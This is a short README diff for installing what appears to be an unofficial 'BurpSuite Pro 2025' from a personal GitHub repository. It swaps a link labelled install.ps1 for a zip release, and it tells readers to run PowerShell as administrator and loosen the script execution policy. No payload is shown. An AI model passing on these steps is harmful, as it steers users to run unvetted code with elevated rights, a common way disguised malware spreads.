@@ -4,7 +4,7 @@
  
 - Make a `Burp` directory name in `C Drive` for faster access.
 
-- Download [install.ps1](https://github.com/HackWithSumit/BurpSuite-Pro-2025/blob/main/install.ps1) and extract move the file inside to `C:\Burp`
+- Download [install.ps1](https://github.com/HackWithSumit/BurpSuite-Pro-2025/releases/download/BurpSuiteProfessional/Burpsuite-Professional-2025.1.zip) and extract move the file inside to `C:\Burp`
 
 - Open `Powershell` as administrator and execute below command to set Script Execution Policy.
 
